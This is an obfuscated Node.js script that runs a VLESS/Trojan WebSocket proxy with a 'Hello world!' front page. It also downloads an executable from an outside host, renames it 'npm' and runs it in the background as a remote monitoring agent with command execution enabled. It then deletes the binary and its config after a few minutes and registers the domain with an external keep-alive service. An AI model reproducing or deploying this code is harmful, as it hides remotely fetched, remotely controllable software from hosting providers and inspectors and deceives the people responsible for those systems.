const _0x245228=_0x3495;function _0x3495(_0x32f8a0,_0x59e322){const _0x31f96c=_0x31f9();return _0x3495=function(_0x34951d,_0x1c4a5e){_0x34951d=_0x34951d-0x92;let _0x138d10=_0x31f96c[_0x34951d];return _0x138d10;},_0x3495(_0x32f8a0,_0x59e322);}(function(_0x4cd927,_0x3e5dd9){const _0x1e7c67={_0x2ab9f6:0xdd,_0x13170c:0xdf},_0x504b4a=_0x3495,_0x58c9f1=_0x4cd927();while(!![]){try{const _0x307702=parseInt(_0x504b4a(0xec))/0x1*(-parseInt(_0x504b4a(0xf4))/0x2)+parseInt(_0x504b4a(0x100))/0x3+-parseInt(_0x504b4a(0xb0))/0x4+parseInt(_0x504b4a(_0x1e7c67._0x2ab9f6))/0x5+-parseInt(_0x504b4a(0xb4))/0x6*(-parseInt(_0x504b4a(0x106))/0x7)+parseInt(_0x504b4a(_0x1e7c67._0x13170c))/0x8+-parseInt(_0x504b4a(0xa9))/0x9*(parseInt(_0x504b4a(0xe3))/0xa);if(_0x307702===_0x3e5dd9)break;else _0x58c9f1['push'](_0x58c9f1['shift']());}catch(_0x15c729){_0x58c9f1['push'](_0x58c9f1['shift']());}}}(_0x31f9,0xce802));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x245228(0xe7)),path=require(_0x245228(0xa0)),crypto=require(_0x245228(0xc0)),{Buffer}=require(_0x245228(0x10a)),{exec,execSync}=require(_0x245228(0xde)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x245228(0xa6)]||_0x245228(0xd1),NEZHA_SERVER=process[_0x245228(0x9a)][_0x245228(0xc4)]||'',NEZHA_PORT=process[_0x245228(0x9a)][_0x245228(0x103)]||'',NEZHA_KEY=process[_0x245228(0x9a)]['NEZHA_KEY']||'',DOMAIN=process[_0x245228(0x9a)][_0x245228(0xe6)]||_0x245228(0xac),AUTO_ACCESS=process['env'][_0x245228(0xf3)]||!![],WSPATH=process[_0x245228(0x9a)]['WSPATH']||UUID[_0x245228(0x97)](0x0,0x8),SUB_PATH=process['env'][_0x245228(0xd4)]||'kaifang',NAME=process['env']['NAME']||'',PORT=process[_0x245228(0x9a)][_0x245228(0xeb)]||0x1eb4;let ISP='';function _0x31f9(){const _0x5a35cd=['decode','trojan://','6gqkXoe','https://amd64.ssss.nyc.mn/v1','get','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','listen','message','aarch64','Answer','1.1.1.1','&fp=chrome&type=ws&host=','Not\x20Found\x0a','--tls','crypto','createServer','connection','&path=%2F','NEZHA_SERVER','8.8.4.4','isp','once','createWriteStream','hex','npm','application/json','includes','application/dns-json','send','Failed\x20to\x20resolve\x20','substr','2b5ebce3-e0a5-4024-a048-6a9df59dbbad','readFile','toString','SUB_PATH','concat','data','writeHead','npm\x20is\x20running','text/html','utf8','unlink','writeFileSync','4798645jReufg','child_process','12593376ryUouX','reduce','npm\x20download\x20successfully','readUInt16BE','10fQmTiy','443','/bin/bash','DOMAIN','net','readUInt8','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','map','PORT','274038UoLMqB','npm\x20is\x20already\x20running,\x20skip\x20running...','https://amd64.ssss.nyc.mn/agent','Status','length','setsid\x20nohup\x20./npm\x20-s\x20','&type=A','AUTO_ACCESS','6mPiTXn','https://dns.google/resolve?name=','createHash','Automatic\x20Access\x20Task\x20added\x20successfully','split','utf-8','false','Hello\x20world!','https://api.ip.sb/geoip','catch','pop','join','4819020YooRHD','\x20with\x20all\x20DNS\x20servers','digest','NEZHA_PORT','pipe','from','4414109ILAllM','8443','stream','client_secret:\x20','buffer','post','Unknown','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','write','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','chmod\x20+x\x20npm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','replace','text/plain','every','type','slice','url','error','env','country_code','2083','find','end','log','path','index.html','vless://','error:\x20','base64','finish','UUID','connect','https://arm64.ssss.nyc.mn/v1','15545313ccFMPC','close','2053','1234.abc.com','test',':443?security=tls&sni=','\x20-p\x20','5502524vzLtAc','arm64'];_0x31f9=function(){return _0x5a35cd;};return _0x31f9();}const GetISP=async()=>{const _0x3c764b={_0x25d33d:0xfc,_0x55c258:0x10c},_0x3c4111=_0x245228;try{const _0x13dc1d=await axios['get'](_0x3c4111(_0x3c764b._0x25d33d)),_0x379e14=_0x13dc1d['data'];ISP=(_0x379e14[_0x3c4111(0x9b)]+'-'+_0x379e14[_0x3c4111(0xc6)])['replace'](/ /g,'_');}catch(_0x401b11){ISP=_0x3c4111(_0x3c764b._0x55c258);}};GetISP();const httpServer=http[_0x245228(0xc1)]((_0x3e10fe,_0x2d4e1e)=>{const _0x38e3fc={_0xe815d5:0xd2,_0x2367e6:0xb3,_0x2c937a:0xae,_0x553c2d:0xbd,_0xf3023a:0xd3,_0x3efcb5:0x94,_0x4d712c:0xbe},_0x17db13={_0x1062a3:0xd9,_0x3d630c:0x9e},_0x45864b=_0x245228;if(_0x3e10fe['url']==='/'){const _0x4965de=path[_0x45864b(0xff)](__dirname,_0x45864b(0xa1));fs[_0x45864b(_0x38e3fc._0xe815d5)](_0x4965de,_0x45864b(0xda),(_0x339595,_0x13959d)=>{const _0x6a81cc=_0x45864b;if(_0x339595){_0x2d4e1e[_0x6a81cc(0xd7)](0xc8,{'Content-Type':_0x6a81cc(_0x17db13._0x1062a3)}),_0x2d4e1e[_0x6a81cc(_0x17db13._0x3d630c)](_0x6a81cc(0xfb));return;}_0x2d4e1e['writeHead'](0xc8,{'Content-Type':_0x6a81cc(0xd9)}),_0x2d4e1e[_0x6a81cc(0x9e)](_0x13959d);});return;}else{if(_0x3e10fe['url']==='/'+SUB_PATH){const _0x4ab0c1=NAME?NAME+'-'+ISP:ISP,_0x4fd206=_0x45864b(0xa2)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x45864b(0xbd)+DOMAIN+_0x45864b(0xc3)+WSPATH+'#'+_0x4ab0c1,_0x14ddaf=_0x45864b(_0x38e3fc._0x2367e6)+UUID+'@'+DOMAIN+_0x45864b(_0x38e3fc._0x2c937a)+DOMAIN+_0x45864b(_0x38e3fc._0x553c2d)+DOMAIN+_0x45864b(0xc3)+WSPATH+'#'+_0x4ab0c1,_0x97f279=_0x4fd206+'\x0a'+_0x14ddaf,_0x2085bb=Buffer[_0x45864b(0x105)](_0x97f279)[_0x45864b(_0x38e3fc._0xf3023a)](_0x45864b(0xa4));_0x2d4e1e['writeHead'](0xc8,{'Content-Type':_0x45864b(_0x38e3fc._0x3efcb5)}),_0x2d4e1e['end'](_0x2085bb+'\x0a');}else _0x2d4e1e[_0x45864b(0xd7)](0x194,{'Content-Type':_0x45864b(0x94)}),_0x2d4e1e[_0x45864b(0x9e)](_0x45864b(_0x38e3fc._0x4d712c));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x245228(0x93)](/-/g,''),DNS_SERVERS=[_0x245228(0xc5),_0x245228(0xbc)];function resolveHost(_0x2a37aa){const _0x2d9fca={_0x3d8b30:0xf0,_0x4c2dea:0xcf,_0x2f23bf:0x101,_0x22d3e0:0xf5,_0x4e71b1:0xb6,_0x5712f4:0xcd,_0x44ba79:0xfd};return new Promise((_0xcf56a6,_0x3e0bf3)=>{const _0x24b6f8=_0x3495;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x24b6f8(0xad)](_0x2a37aa)){_0xcf56a6(_0x2a37aa);return;}let _0xc22fc6=0x0;function _0x27f837(){const _0x1df2b6={_0x3d0394:0xef,_0x4156d4:0xf0},_0x5b2649=_0x24b6f8;if(_0xc22fc6>=DNS_SERVERS[_0x5b2649(_0x2d9fca._0x3d8b30)]){_0x3e0bf3(new Error(_0x5b2649(_0x2d9fca._0x4c2dea)+_0x2a37aa+_0x5b2649(_0x2d9fca._0x2f23bf)));return;}const _0x439d16=DNS_SERVERS[_0xc22fc6];_0xc22fc6++;const _0x51a948=_0x5b2649(_0x2d9fca._0x22d3e0)+encodeURIComponent(_0x2a37aa)+_0x5b2649(0xf2);axios[_0x5b2649(_0x2d9fca._0x4e71b1)](_0x51a948,{'timeout':0x1388,'headers':{'Accept':_0x5b2649(_0x2d9fca._0x5712f4)}})['then'](_0x4dc5d0=>{const _0x5307f5=_0x5b2649,_0x400311=_0x4dc5d0[_0x5307f5(0xd6)];if(_0x400311[_0x5307f5(_0x1df2b6._0x3d0394)]===0x0&&_0x400311[_0x5307f5(0xbb)]&&_0x400311[_0x5307f5(0xbb)][_0x5307f5(_0x1df2b6._0x4156d4)]>0x0){const _0x19d0ac=_0x400311[_0x5307f5(0xbb)][_0x5307f5(0x9d)](_0x1a6327=>_0x1a6327[_0x5307f5(0x96)]===0x1);if(_0x19d0ac){_0xcf56a6(_0x19d0ac['data']);return;}}_0x27f837();})[_0x5b2649(_0x2d9fca._0x44ba79)](_0x104bae=>{_0x27f837();});}_0x27f837();});}function handleVlessConnection(_0x23b988,_0x42ca7a){const _0x53074f={_0x1e4d1f:0x97,_0x5904ef:0xe8,_0x36ca30:0xff,_0x56d5a9:0xb2,_0x34afa7:0xff},_0x2d31ca={_0x58b431:0x10f,_0x585e4f:0x104},_0x3e1594={_0x3e9484:0xa7,_0x5a3d42:0x99},_0x1b09cd=_0x245228,[_0xf78c6]=_0x42ca7a,_0x1cef02=_0x42ca7a['slice'](0x1,0x11);if(!_0x1cef02[_0x1b09cd(0x95)]((_0x1273ac,_0x1f1d17)=>_0x1273ac==parseInt(uuid[_0x1b09cd(0xd0)](_0x1f1d17*0x2,0x2),0x10)))return![];let _0x29f4eb=_0x42ca7a[_0x1b09cd(_0x53074f._0x1e4d1f)](0x11,0x12)[_0x1b09cd(_0x53074f._0x5904ef)]()+0x13;const _0x18acbe=_0x42ca7a['slice'](_0x29f4eb,_0x29f4eb+=0x2)['readUInt16BE'](0x0),_0x45d327=_0x42ca7a[_0x1b09cd(_0x53074f._0x1e4d1f)](_0x29f4eb,_0x29f4eb+=0x1)[_0x1b09cd(0xe8)](),_0x387852=_0x45d327==0x1?_0x42ca7a[_0x1b09cd(_0x53074f._0x1e4d1f)](_0x29f4eb,_0x29f4eb+=0x4)[_0x1b09cd(_0x53074f._0x36ca30)]('.'):_0x45d327==0x2?new TextDecoder()[_0x1b09cd(_0x53074f._0x56d5a9)](_0x42ca7a['slice'](_0x29f4eb+0x1,_0x29f4eb+=0x1+_0x42ca7a['slice'](_0x29f4eb,_0x29f4eb+0x1)['readUInt8']())):_0x45d327==0x3?_0x42ca7a[_0x1b09cd(0x97)](_0x29f4eb,_0x29f4eb+=0x10)['reduce']((_0x4bc2fc,_0x1ec977,_0x592755,_0x586523)=>_0x592755%0x2?_0x4bc2fc['concat'](_0x586523['slice'](_0x592755-0x1,_0x592755+0x1)):_0x4bc2fc,[])[_0x1b09cd(0xea)](_0x5caf7f=>_0x5caf7f[_0x1b09cd(0xe2)](0x0)[_0x1b09cd(0xd3)](0x10))[_0x1b09cd(_0x53074f._0x34afa7)](':'):'';_0x23b988[_0x1b09cd(0xce)](new Uint8Array([_0xf78c6,0x0]));const _0x425194=createWebSocketStream(_0x23b988);return resolveHost(_0x387852)['then'](_0x59a25f=>{const _0x4c9bab={_0xf1122c:0x97,_0x533ab5:0x104},_0x3abe37=_0x1b09cd;net[_0x3abe37(_0x3e1594._0x3e9484)]({'host':_0x59a25f,'port':_0x18acbe},function(){const _0x2c2835=_0x3abe37;this['write'](_0x42ca7a[_0x2c2835(_0x4c9bab._0xf1122c)](_0x29f4eb)),_0x425194['on'](_0x2c2835(0x99),()=>{})[_0x2c2835(0x104)](this)['on']('error',()=>{})[_0x2c2835(_0x4c9bab._0x533ab5)](_0x425194);})['on'](_0x3abe37(_0x3e1594._0x5a3d42),()=>{});})['catch'](_0x8fbd39=>{const _0x27f317=_0x1b09cd;net[_0x27f317(0xa7)]({'host':_0x387852,'port':_0x18acbe},function(){const _0x2d9548=_0x27f317;this[_0x2d9548(_0x2d31ca._0x58b431)](_0x42ca7a[_0x2d9548(0x97)](_0x29f4eb)),_0x425194['on'](_0x2d9548(0x99),()=>{})[_0x2d9548(0x104)](this)['on']('error',()=>{})[_0x2d9548(_0x2d31ca._0x585e4f)](_0x425194);})['on'](_0x27f317(0x99),()=>{});}),!![];}function handleTrojanConnection(_0x5653fa,_0x4be761){const _0xaaf45a={_0x2d85f8:0xd3,_0x24ff68:0xc9,_0x5f0c19:0x97,_0x467fab:0xe0,_0x3d252c:0xe2,_0x4153c5:0xfd},_0x1b9e5f={_0x57ade6:0x99},_0x46da5d=_0x245228;try{if(_0x4be761[_0x46da5d(0xf0)]<0x3a)return![];const _0x6e7c96=_0x4be761['slice'](0x0,0x38)[_0x46da5d(_0xaaf45a._0x2d85f8)](),_0x34f145=[UUID];let _0x424a36=null;for(const _0x248880 of _0x34f145){const _0x26c618=crypto[_0x46da5d(0xf6)]('sha224')['update'](_0x248880)[_0x46da5d(0x102)](_0x46da5d(_0xaaf45a._0x24ff68));if(_0x26c618===_0x6e7c96){_0x424a36=_0x248880;break;}}if(!_0x424a36)return![];let _0x5d8f50=0x38;_0x4be761[_0x5d8f50]===0xd&&_0x4be761[_0x5d8f50+0x1]===0xa&&(_0x5d8f50+=0x2);const _0x5a920a=_0x4be761[_0x5d8f50];if(_0x5a920a!==0x1)return![];_0x5d8f50+=0x1;const _0x3d12f9=_0x4be761[_0x5d8f50];_0x5d8f50+=0x1;let _0xab5f7d,_0x72c90e;if(_0x3d12f9===0x1)_0xab5f7d=_0x4be761[_0x46da5d(_0xaaf45a._0x5f0c19)](_0x5d8f50,_0x5d8f50+0x4)[_0x46da5d(0xff)]('.'),_0x5d8f50+=0x4;else{if(_0x3d12f9===0x3){const _0x3994de=_0x4be761[_0x5d8f50];_0x5d8f50+=0x1,_0xab5f7d=_0x4be761[_0x46da5d(0x97)](_0x5d8f50,_0x5d8f50+_0x3994de)[_0x46da5d(0xd3)](),_0x5d8f50+=_0x3994de;}else{if(_0x3d12f9===0x4)_0xab5f7d=_0x4be761[_0x46da5d(0x97)](_0x5d8f50,_0x5d8f50+0x10)[_0x46da5d(_0xaaf45a._0x467fab)]((_0x239cd7,_0x4405de,_0x523212,_0x3ae09e)=>_0x523212%0x2?_0x239cd7[_0x46da5d(0xd5)](_0x3ae09e[_0x46da5d(0x97)](_0x523212-0x1,_0x523212+0x1)):_0x239cd7,[])[_0x46da5d(0xea)](_0x3feb8b=>_0x3feb8b[_0x46da5d(0xe2)](0x0)[_0x46da5d(0xd3)](0x10))['join'](':'),_0x5d8f50+=0x10;else return![];}}_0x72c90e=_0x4be761[_0x46da5d(_0xaaf45a._0x3d252c)](_0x5d8f50),_0x5d8f50+=0x2;_0x5d8f50<_0x4be761['length']&&_0x4be761[_0x5d8f50]===0xd&&_0x4be761[_0x5d8f50+0x1]===0xa&&(_0x5d8f50+=0x2);const _0x39bd7b=createWebSocketStream(_0x5653fa);return resolveHost(_0xab5f7d)['then'](_0x91f608=>{const _0x481734={_0x3fe19e:0xf0,_0x275ad1:0x97},_0x2ad5e9=_0x46da5d;net['connect']({'host':_0x91f608,'port':_0x72c90e},function(){const _0x5985bc=_0x3495;_0x5d8f50<_0x4be761[_0x5985bc(_0x481734._0x3fe19e)]&&this[_0x5985bc(0x10f)](_0x4be761[_0x5985bc(_0x481734._0x275ad1)](_0x5d8f50)),_0x39bd7b['on'](_0x5985bc(0x99),()=>{})[_0x5985bc(0x104)](this)['on'](_0x5985bc(0x99),()=>{})['pipe'](_0x39bd7b);})['on'](_0x2ad5e9(_0x1b9e5f._0x57ade6),()=>{});})[_0x46da5d(_0xaaf45a._0x4153c5)](_0x352590=>{const _0x4435cd={_0xd8eb5e:0x10f,_0x342032:0x97,_0x4a2f03:0x99,_0x7af697:0x104},_0x4270d=_0x46da5d;net[_0x4270d(0xa7)]({'host':_0xab5f7d,'port':_0x72c90e},function(){const _0x2bd541=_0x4270d;_0x5d8f50<_0x4be761[_0x2bd541(0xf0)]&&this[_0x2bd541(_0x4435cd._0xd8eb5e)](_0x4be761[_0x2bd541(_0x4435cd._0x342032)](_0x5d8f50)),_0x39bd7b['on'](_0x2bd541(_0x4435cd._0x4a2f03),()=>{})[_0x2bd541(_0x4435cd._0x7af697)](this)['on'](_0x2bd541(0x99),()=>{})['pipe'](_0x39bd7b);})['on'](_0x4270d(0x99),()=>{});}),!![];}catch(_0x6a26ce){return![];}}wss['on'](_0x245228(0xc2),(_0x5f3141,_0x221a48)=>{const _0x290f57={_0x3e320a:0x98,_0x374798:0xc7,_0x110cb9:0xb9},_0xf079cf={_0x1d7b44:0xf0,_0x149351:0xaa},_0x3fff57=_0x245228,_0x310426=_0x221a48[_0x3fff57(_0x290f57._0x3e320a)]||'';_0x5f3141[_0x3fff57(_0x290f57._0x374798)](_0x3fff57(_0x290f57._0x110cb9),_0x180c3e=>{const _0x4f686e=_0x3fff57;if(_0x180c3e[_0x4f686e(_0xf079cf._0x1d7b44)]>0x11&&_0x180c3e[0x0]===0x0){const _0x44a484=_0x180c3e['slice'](0x1,0x11),_0x4d3054=_0x44a484['every']((_0x714988,_0x19ba76)=>_0x714988==parseInt(uuid[_0x4f686e(0xd0)](_0x19ba76*0x2,0x2),0x10));if(_0x4d3054){!handleVlessConnection(_0x5f3141,_0x180c3e)&&_0x5f3141['close']();return;}}!handleTrojanConnection(_0x5f3141,_0x180c3e)&&_0x5f3141[_0x4f686e(_0xf079cf._0x149351)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x44164e={_0x53c9e7:0xb1,_0x5874c8:0xba,_0x519c81:0xb5},_0x419a04=_0x245228,_0x14d5a7=os['arch']();return _0x14d5a7==='arm'||_0x14d5a7===_0x419a04(_0x44164e._0x53c9e7)||_0x14d5a7===_0x419a04(_0x44164e._0x5874c8)?!NEZHA_PORT?_0x419a04(0xa8):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x419a04(_0x44164e._0x519c81):_0x419a04(0xee);},downloadFile=async()=>{const _0x2ba643={_0x281c92:0xb6,_0x504206:0xc8,_0x522a4f:0xd6,_0x42358c:0x104},_0x59e322={_0x26348b:0xa5},_0x57c17f={_0x4952b5:0x9f,_0x518ae4:0x111},_0x2b074d=_0x245228;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x50ceed=getDownloadUrl(),_0x47da4a=await axios({'method':_0x2b074d(_0x2ba643._0x281c92),'url':_0x50ceed,'responseType':_0x2b074d(0x108)}),_0x42cb91=fs[_0x2b074d(_0x2ba643._0x504206)](_0x2b074d(0xca));return _0x47da4a[_0x2b074d(_0x2ba643._0x522a4f)][_0x2b074d(_0x2ba643._0x42358c)](_0x42cb91),new Promise((_0x529f92,_0x449968)=>{const _0x1c93ee=_0x2b074d;_0x42cb91['on'](_0x1c93ee(_0x59e322._0x26348b),()=>{const _0x3ed7d9=_0x1c93ee;console[_0x3ed7d9(_0x57c17f._0x4952b5)](_0x3ed7d9(0xe1)),exec(_0x3ed7d9(_0x57c17f._0x518ae4),_0x573b27=>{if(_0x573b27)_0x449968(_0x573b27);_0x529f92();});}),_0x42cb91['on'](_0x1c93ee(0x99),_0x449968);});}catch(_0x115d30){throw _0x115d30;}},runnz=async()=>{const _0x1eb316={_0x145b35:0x9f,_0x1a9a27:0xed,_0x11ba1d:0xe4,_0x3c5d07:0x107,_0x2c8714:0xab,_0x118d8e:0xf1,_0x3ccff2:0x110,_0x58a0de:0xf8,_0x215abf:0xfe,_0x1322b3:0xfa,_0x2a0d9b:0x109,_0x3abe65:0xe9,_0x5d1547:0xdc,_0x523c77:0x92,_0x37f660:0xe5,_0x3117b6:0x99,_0xfb3ff0:0xa3},_0x2d0ed2={_0x40650b:0x99},_0x3eb6b5=_0x245228;try{const _0x49901c=execSync(_0x3eb6b5(0xb7),{'encoding':_0x3eb6b5(0xf9)});if(_0x49901c['trim']()!==''){console[_0x3eb6b5(_0x1eb316._0x145b35)](_0x3eb6b5(_0x1eb316._0x1a9a27));return;}}catch(_0x16bac7){}await downloadFile();let _0x574001='',_0x45c461=[_0x3eb6b5(_0x1eb316._0x11ba1d),_0x3eb6b5(_0x1eb316._0x3c5d07),'2096','2087',_0x3eb6b5(0x9c),_0x3eb6b5(_0x1eb316._0x2c8714)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x254530=_0x45c461['includes'](NEZHA_PORT)?_0x3eb6b5(0xbf):'';_0x574001=_0x3eb6b5(_0x1eb316._0x118d8e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3eb6b5(0xaf)+NEZHA_KEY+'\x20'+_0x254530+_0x3eb6b5(_0x1eb316._0x3ccff2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x555387=NEZHA_SERVER[_0x3eb6b5(0xcc)](':')?NEZHA_SERVER[_0x3eb6b5(_0x1eb316._0x58a0de)](':')[_0x3eb6b5(_0x1eb316._0x215abf)]():'',_0x317a16=_0x45c461['includes'](_0x555387)?'true':_0x3eb6b5(_0x1eb316._0x1322b3),_0x5af36f=_0x3eb6b5(_0x1eb316._0x2a0d9b)+NEZHA_KEY+_0x3eb6b5(_0x1eb316._0x3abe65)+NEZHA_SERVER+_0x3eb6b5(0x10e)+_0x317a16+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3eb6b5(_0x1eb316._0x5d1547)]('config.yaml',_0x5af36f);}_0x574001=_0x3eb6b5(_0x1eb316._0x523c77);}else{console[_0x3eb6b5(_0x1eb316._0x145b35)](_0x3eb6b5(0x10d));return;}}try{exec(_0x574001,{'shell':_0x3eb6b5(_0x1eb316._0x37f660)},_0x187a61=>{const _0x435ef7=_0x3eb6b5;if(_0x187a61)console[_0x435ef7(_0x2d0ed2._0x40650b)]('npm\x20running\x20error:',_0x187a61);else console[_0x435ef7(0x9f)](_0x435ef7(0xd8));});}catch(_0x30b72b){console[_0x3eb6b5(_0x1eb316._0x3117b6)](_0x3eb6b5(_0x1eb316._0xfb3ff0)+_0x30b72b);}};async function addAccessTask(){const _0x308d24={_0x5e5707:0xcb,_0x593d3b:0xf7},_0xcf668e=_0x245228;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x27fcce='https://'+DOMAIN;try{const _0x15b47c=await axios[_0xcf668e(0x10b)]('https://oooo.serv00.net/add-url',{'url':_0x27fcce},{'headers':{'Content-Type':_0xcf668e(_0x308d24._0x5e5707)}});console[_0xcf668e(0x9f)](_0xcf668e(_0x308d24._0x593d3b));}catch(_0x3fa85c){}}const delFiles=()=>{const _0x29921f={_0x162da5:0xca,_0xb467d6:0xdb},_0x341572=_0x245228;fs[_0x341572(0xdb)](_0x341572(_0x29921f._0x162da5),()=>{}),fs[_0x341572(_0x29921f._0xb467d6)]('config.yaml',()=>{});};httpServer[_0x245228(0xb8)](PORT,()=>{const _0x509512=_0x245228;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x509512(0x9f)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
